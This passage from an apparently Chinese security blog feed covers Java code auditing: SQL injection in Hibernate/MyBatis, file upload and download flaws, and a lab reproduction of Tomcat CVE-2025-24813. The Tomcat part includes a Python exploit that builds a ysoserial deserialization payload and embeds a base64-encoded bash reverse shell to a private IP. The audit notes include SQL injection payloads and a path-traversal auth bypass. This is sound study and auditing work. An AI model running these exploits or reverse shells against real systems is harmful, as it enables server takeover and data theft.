:name&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>, parameter);<br></code></pre></td></tr></table></figure><p>2.位置参数（Positional parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-number">1</span>, parameter);<br></code></pre></td></tr></table></figure><p>3.命名参数列表（named parameter list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">&quot;g1ts&quot;</span>, <span class="hljs-string">&quot;g2ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name in (:names)&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;names&quot;</span>, names);<br></code></pre></td></tr></table></figure><p>4.类实例（JavaBean）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">user1.setName(<span class="hljs-string">&quot;g1ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name =:name&quot;</span>, User.class);<br>query.setProperties(user1);<br></code></pre></td></tr></table></figure><p>5.HQL拼接方法</p><p> 这种方式是最常用，而且容易忽视且容易被注入的，通常做法就是对参数的特殊字符进行过滤，推荐大家使用 Spring工具包的StringEscapeUtils.escapeSql()方法对参数进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringEscapeUtils.escapeSql(<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>  System.out.println(str);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>Hibernate支持使用原生SQL语句执行，所以其风险和JDBC是一致的，直接使用拼接的方法时会导致SQL注入</p><p>语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;People&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>正确写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where name = :name&quot;</span>);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>,parameter);<br></code></pre></td></tr></table></figure><h2 id="预编译下的sql注入"><a href="#预编译下的sql注入" class="headerlink" title="预编译下的sql注入"></a>预编译下的sql注入</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>预编译是将sql语句参数化，可预编译的语句，如 where语句中的内容是被参数化的。这就是说，预编译仅仅只能防御住可参数化位置的sql注入。那么，对于不可参数化的位置，预编译将没有任何办法。</p><p>不可参数化的位置：</p><ol><li>表名、列名</li><li>order by、group by</li><li>limit</li><li>join</li><li>等</li></ol><p>我们以order by举例，现在有一个sql语句如下（以下均为伪代码）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY &#123;user_input&#125;;<br></code></pre></td></tr></table></figure><p>其中user_input是传递过来的参数，例如 id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;<br></code></pre></td></tr></table></figure><p>这个语句是没有问题的，但是如果user_input输入为 id;drop table users –</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;drop table users --+<br></code></pre></td></tr></table></figure><p>这样就被成功注入了，而这种位置是不可被参数化的，所以是无法通过预编译防御的</p><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><p>所以，对于sql注入存在两种情况，可参数化的，不可参数化的。</p><p>对于可参数化没商量，直接预编译解决一切。</p><p>而对于不可参数化的，只能通过设置白名单，过滤特殊符号，通过加引号强制转为字符串等方式进行拦截。</p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 RCE复现</title>
    <link href="/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2025-24813-RCE复现"><a href="#CVE-2025-24813-RCE复现" class="headerlink" title="CVE-2025-24813 RCE复现"></a>CVE-2025-24813 RCE复现</h1><p>参考文章：</p><p><a href="https://blog.csdn.net/Dalock/article/details/146425886">Tomcat RCE（CVE-2025-24813）复现_cve-2025-24813 复现-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.meteorkai.top/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%83%A8%E5%88%86DefaultServlet-doPut">CVE-2025-24813 Tomcat RCE 分析复现 (meteorkai.top)</a></p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><h4 id="漏洞影响范围-1"><a href="#漏洞影响范围-1" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><ul><li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</li></ul><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>DefaultServlet 写入功能启用：需要在<code>web.xml</code>中配置<code>readonly=false</code></li><li>PartialPUT请求支持：tomcat中默认支持分块上传</li><li>文件会话持久化启用：在 context.xml 中配置 PersistentManager 和 FileStore</li><li>存在反序列化的利用链：需要包含漏洞的库（这里使用commons-collections-3.2.1.jar）</li></ol><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol><li>Tomcat中文件会话持久化技术，<code>Content-Range</code>在Tomcat的HTTP PUT请求中主要实现用于大文件的分块传输，在文件上传未完成的情况下，会被临时储存在Tomcat的工作目录下<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>中</li><li>漏洞核心在于：对不完整的PUT请求上传的文件名处理机制：文件路径中的分隔符<code>/</code>会被转化为<code>.</code>。例如：对于PUT请求的路径<code>/evil/session</code>会被解析为<code>.evil.session</code>中</li><li>Tomcat的File会话存储默认路径同样位于：<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>，在Cookie中带有<code>JSESSIONID</code>字段时，Tomcat会将该字段中的<code>.id</code>与<code>.session</code>拼接，并从会话存储路径中寻找文件名为<code>.id.session</code>的文件，对该文件的内容进行反序列化操作，从而触发攻击链</li></ol><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><ol><li>当存在反序列化利用链时，上传包含恶意的序列化数据文件（临时存储在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li><li>通过设置<code>JSESSIONID=.xxxx</code>来触发漏洞（位置也在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li></ol><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul><li><p>新建一个对应的tomcat项目</p></li><li><p>启用DefaultServlet写入</p><p>在<code>conf/web.xml</code>中，将DefaultServlet的readonly配置为false（默认true），启用写入功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>启用文件会话持久化并使用默认的会话存储位置</p><p>在<code>conf/context.xml</code>中，添加如下配置，开启File文件会话存储：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul><li><p>尝试过使用burpsuit和yakit发送数据包，发现都不成功，也有发送的文件文件名被重写保存在&#x2F;tomcat文件下，尝试后发现只有使用python写脚本发包能够正常保存.session文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> requests<br> <br>target = <span class="hljs-string">&quot;http://172.31.80.1:8080/poc/session&quot;</span><br>target_poc = <span class="hljs-string">&quot;http://172.31.80.1:8080/&quot;</span><br> <br><span class="hljs-comment"># ysoserial.jar 文件路径</span><br>fp = <span class="hljs-string">&#x27;D:\java漏洞利用\ysoserial-all.jar&#x27;</span><br> <br>gadget = <span class="hljs-string">&quot;CommonsCollections5&quot;</span><br>linux_rshell = <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>linux_cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>win_cmd = <span class="hljs-string">&quot;calc&quot;</span><br> <br>command = win_cmd<br> <br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fp):<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;jar file not found&#x27;</span>)<br>popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,fp,gadget,command],<br>                         stdout=subprocess.PIPE)<br> <br>file_body = popen.stdout.read()<br> <br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;3000&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">&#x27;bytes 0-3000/3200&#x27;</span><br>&#125;<br>response = requests.put(target, data=file_body, headers=headers, timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment"># print(response.text)</span><br> <br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to continue...&quot;</span>)<br> <br>response = requests.get(target_poc, cookies=&#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;.poc&#x27;</span>&#125;, timeout=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure></li><li><p>在Catalina&#x2F;localhost&#x2F;ROOT&#x2F;org&#x2F;apache&#x2F;jsp路径下，可以看到成功上传了带有恶意序列化数据的文件</p><p><img src="/img/CVE02.png"></p><p>但是并未弹出计算器，显示服务器内部出错</p></li><li><p>分析后发现是导入tomcat的jar包时出现一些问题，jar包未导入库中，原因未知</p></li></ul><h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><ul><li><p>jar包导入时出现了问题，没有继续调试了，只看了文章</p></li><li><p>临时文件创建源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">doPut(DefaultServlet)-&gt;executePartialPut<br>条件：<br> 1.readOnly=<span class="hljs-literal">false</span><br> 2.Content-Range合法<br>executePartialPut方法核心控制：<br>将一个path中的/替换为.后当作文件名，然后写入到工作目录下的ROOT路径下的.poc.session中<br>走到<span class="hljs-built_in">return</span> contentFile时，的恶意文件已经写好<br></code></pre></td></tr></table></figure></li><li><p>反序列化漏洞触发过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">触发点：load方法(其中的特殊函数:ObjectInputStream 反序列化漏洞的特殊函数)<br>-&gt;file方法(接受Cookie中的<span class="hljs-built_in">id</span>，然后与.session拼接起来，然后将文件名为.poc.session的File类型的属性返回回去)<br>-&gt;FileInpuStream(将文件内容以字节流的方式读出)<br>-&gt;readObject(进行反序列化，触发构造的攻击链)<br></code></pre></td></tr></table></figure></li></ul><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><ul><li><p>从磁盘导入jdk时一直显示不是jdk有效路径</p><p>解决：更改jdk安装路径时必须将新文件夹命名为jdk1.8.0_版本，否则IDEA无法识别</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计</title>
    <link href="/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计"><a href="#Java代码审计" class="headerlink" title="Java代码审计"></a>Java代码审计</h2><ul><li>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</li><li>分析变量组成：打印出每个过程参数的值逐个分析(调试)</li></ul><h3 id="通用步骤"><a href="#通用步骤" class="headerlink" title="通用步骤"></a>通用步骤</h3><ul><li>寻找漏洞触发点</li><li>构造payload尝试利用漏洞</li></ul><h3 id="checklist"><a href="#checklist" class="headerlink" title="checklist"></a>checklist</h3><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">Java代码审计checklist（上） (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">JAVA攻防基础之代码审计 (qq.com)</a></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li><p>三个模式</p><p>JDBC，Mybatis，Hibernate</p><p>JDBC与Mybatis：<a href="https://blog.csdn.net/keyboard_/article/details/127477755">持久层技术对比：Mybatis 与 JDBC 的区别到底在哪里_jdbc和mybatis的应用场景-CSDN博客</a></p></li><li><p>出现注入</p><ul><li>原生JDBC是否存在直接拼接sql语句(使用+，或者使用StringBuilder.append())，未经过预编译</li><li>Mybatis使用${}</li><li>Hibernate, JPA是默认经过预编译的，但是开发自己编写的sql语句，需要检查</li></ul></li><li><p>参考文章：<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">JAVA常用框架SQL注入审计 (qq.com)</a></p></li><li><p>判断模式</p><ul><li>看项目中说明使用的技术框架</li><li>看引用中加载的那些技术框架</li><li>看配置源码中相关的配置文件</li></ul></li><li><p>入口确定</p><ol><li>是否使用预编译技术，预编译是否完整</li><li>定位sql语句上下文，查看是否有参数直接拼接，是否对模糊查询关键字的过滤</li><li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询，order by排序，范围查询in，动态列名，表名，只能拼接，所以还是需要手工防注入<br>注：like和in语句直接使用#{}会报错，改为${}恢复正常但是无法预编译</li></ol></li></ul><p>​正确写法：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">  mysql:<br>    select * from users where username like <span class="hljs-title function_">concat</span><span class="hljs-params">(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)</span><br>  oracle:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>||#&#123;username&#125;||<span class="hljs-string">&#x27;%&#x27;</span><br>  sqlserver:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>+#&#123;username&#125;+<span class="hljs-string">&#x27;%&#x27;</span><br>  ```  <br><br><br>#### 步骤<br><br>- 找模式<br>- 搜关键字<br>- 追踪确定可控变量<br>- 确定路由<br>- 构造payload测试<br><br>#### jfinal_cms案例<br><br>- 查看配置文件发现是JDBC驱动<br><br>- 全局搜索append()关键字，寻找与sql相关的语句<br><br>  ![图片](/img/java审计/java审计<span class="hljs-number">01.</span>png)<br><br>  发现新定义了一个sql语句，并且使用了append()函数拼接<br><br>- 判断orderBy变量是否可控，有无过滤<br><br>  - 追踪getBaseForm()类与getOrderBy()方法发现<br><br>    ![](/img/java审计/java审计<span class="hljs-number">02.</span>png)<br><br>- 找到对应路由后访问抓包，发现数据包中有form.orderColumn参数，添加*号放到sqlmap中测试payload<br><br>#### oa_system-master案例<br><br>- 查看文字说明发现此oa系统使用的是Mybatis框架<br><br>- 指定文件掩码为 *.xml，全局搜索$&#123;<br><br>  ![](/img/java审计/java审计<span class="hljs-number">03.</span>png)<br><br>  跳转查看baseKey参数，全局搜索selece的id值sortMyNotice<br><br>- 寻找baseKey的实现，确定路由为(/informlistpaging)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">04.</span>png)<br><br>- 找到路由后访问抓取数据包，使用sqlmap测试payload<br><br>#### RuoYi案例<br><br>- 在源码简介处发现使用的Mybatis框架<br><br>- 搜索关键字$&#123;<br><br>- 找到可能存在不安全写法的地方(筛选出可能的注入点，可执行sql语句)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">05.</span>png)<br><br>  追踪updateDeptStatus的用法<br><br>- 全局搜索updateDeptStatus关键字逐个查找用法(寻找路由关系)<br><br>- 直接搜索updateDeptStatus关键字发现此关键字出现在service层中<br><br>  - 基于springboot中，执行sql语句的三个调用<br>    - 业务层调用Dao层<br>    - controller调用service层间接调用Dao层<br>    - controller直接调用Dao层<br>  - 路由关系一般写在controller中<br><br>- 选中updateDeptStatus关键字，点击查找用法，发现updateDept调用了此方法，继续追踪此方法，找到SysDeptController文件中有调用updateDept方法，<br><br>  顺利找到路由关系<br><br>  $&#123;-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;/system/dept/edit<br><br>- 测试payload<br><br>  - 直接访问url地址发现报错<br><br>  - 根据中文注释找到功能点抓取数据包，成功找到/system/dept/edit路由的数据<br><br>  - 发现数据包中没有注入参数值，尝试手动添加<br><br>  - 使用sqlmap无法成功注入，使用手工注入<br><br>  - ```java<br>    DeptName=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;&amp;status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select <span class="hljs-title function_">user</span><span class="hljs-params">()</span>))));#<br></code></pre></td></tr></table></figure></p><ul><li>使用括号绕过空格过滤</li></ul><h3 id="文件安全"><a href="#文件安全" class="headerlink" title="文件安全"></a>文件安全</h3><p><a href="https://blog.csdn.net/god_zzZ/article/details/108104523">Java代码审计：文件篇&#x2F;文件上传&#x2F;文件读取&#x2F;目录遍历_潜在路径遍历(文件读取) 打开文件以读取其内容。文件名来自输入参数。如果将未过-CSDN博客</a></p><ul><li><p>关键字查询</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A106.png"></p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A107.png"></p></li></ul><h4 id="Inxedu案例-前台文件上传"><a href="#Inxedu案例-前台文件上传" class="headerlink" title="Inxedu案例(前台文件上传)"></a>Inxedu案例(前台文件上传)</h4><ul><li><p>搭建网站后直接寻找功能点，发现有文件上传</p></li><li><p>尝试上传文件找到路由</p></li><li><p>此网站源码将文件安全代码封装在jar包中，&#x2F;UploadController.class，需要通读目录，理清结构才能找到</p></li><li><p>根据上传文件时找到的路由，确定控制代码</p></li><li><p>发现是黑名单过滤，只过滤jsp文件</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A108.png"></p></li><li><p>使用工具生成jspx文件，修改前端白名单过滤代码，成功上传</p></li></ul><h4 id="Tmall案例"><a href="#Tmall案例" class="headerlink" title="Tmall案例"></a>Tmall案例</h4><h5 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h5><ul><li><p>搜索文件安全相关关键字</p></li><li><p>搜索new File，找到文件上传相关代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A109.png"></p><p>文件上传过滤一般关注后缀，所以在此段代码中应该关注文件名后缀是如何获取的</p><p>发现这段代码是直接获取了原文件后缀后并没有过滤，而是直接上传了</p></li><li><p>开始测试，发现有前端验证，抓包后更改后缀为jsp可以正常上传</p></li></ul><h5 id="过滤器鉴权"><a href="#过滤器鉴权" class="headerlink" title="过滤器鉴权"></a>过滤器鉴权</h5><ul><li><p>找到过滤器核心代码AdminPermissionFilter类</p></li><li><p>找到核心控制方法doFilter</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A110.png"></p><p>发现鉴权存在了漏洞，容易越权</p></li><li><p>进行测试</p><ul><li>在数据包url中加上 &#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;</li><li>成功绕过鉴权</li></ul></li></ul><h4 id="RuoYi-4-5-0-文件下载"><a href="#RuoYi-4-5-0-文件下载" class="headerlink" title="RuoYi-4.5.0(文件下载)"></a>RuoYi-4.5.0(文件下载)</h4><ul><li><p>搜索关键字new FileInputStream</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A111.png"></p><p>找到这段相关代码控制字节输出，但是发现这个类中没有路由关系，不能直接触发此漏洞</p></li><li><p>尝试查找是否有用过writeBytes方法</p></li><li><p>查找用法后发现，CommonController类中fileDownload方法和resourceDownload方法调用了此方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">// 本地资源路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>        <span class="hljs-comment">// 数据库资源地址</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// 下载名称</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>打印出localPath与downloadPath的值查看resource参数是如何构成的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A112.png"></p><p>代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 